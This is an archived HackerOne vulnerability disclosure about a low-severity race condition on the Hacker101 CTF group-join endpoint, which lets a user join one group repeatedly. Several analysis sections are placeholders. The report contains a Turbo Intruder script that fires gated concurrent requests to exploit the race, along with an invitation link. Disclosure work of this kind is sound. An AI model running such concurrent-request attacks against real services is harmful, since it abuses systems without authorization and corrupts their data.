# Race condition in joining CTF group

## Metadata
- **Source:** HackerOne
- **Report:** 1540969 | https://hackerone.com/reports/1540969
- **Submitted:** 2022-04-14
- **Reporter:** zeyu2001
- **Program:** Unknown
- **Bounty:** $500
- **Severity:** low
- **Vuln:** Time-of-check Time-of-use (TOCTOU) Race Condition
- **CVEs:** None
- **Category:** business-logic

## Summary
**Summary:**

A race condition in `https://ctf.hacker101.com/group/join` allows a user to join the same CTF group multiple times. 

The user will show up in the group member list multiple times, and affect the group statistics.

**Description:**

Interestingly a race condition in this feature was reported in #604534, but it seems like the implementation has changed slightly, allowing the same issu

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

**Summary:**

A race condition in `https://ctf.hacker101.com/group/join` allows a user to join the same CTF group multiple times. 

The user will show up in the group member list multiple times, and affect the group statistics.

**Description:**

Interestingly a race condition in this feature was reported in #604534, but it seems like the implementation has changed slightly, allowing the same issue to occur.

### Steps To Reproduce

1. As the team leader, generate a shared invitation link. For this example the link was `https://ctf.hacker101.com/group/join?invite=fdb4ba75da6e8da41650369d24e3866f90384550f952474df194db8077bda8b0`.

2. Use Burp Suite to intercept this request and configure Turbo Intruder as follows:

```python
# Find more example scripts at https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=100,
                           requestsPerConnection=100,
                           pipeline=True
                           )

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    for i in range(30):
        engine.queue(target.req, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)

```

{F1692527}

3. Start the attack, and observe multiple requests succeeding with status code 200.

{F1692528}

We can verify from the invited user's screen that we have joined the same group multiple times.

{F1692529}

The user will also show up in the group multiple times from the group leader's screen.

{F1692530}

## Impact

Race condition allows a user to join the same group multiple times. This is more of a low-impact bug, but one that should be fixed nonetheless.

</details>

---
*Analysed by Claude on 2026-05-24*
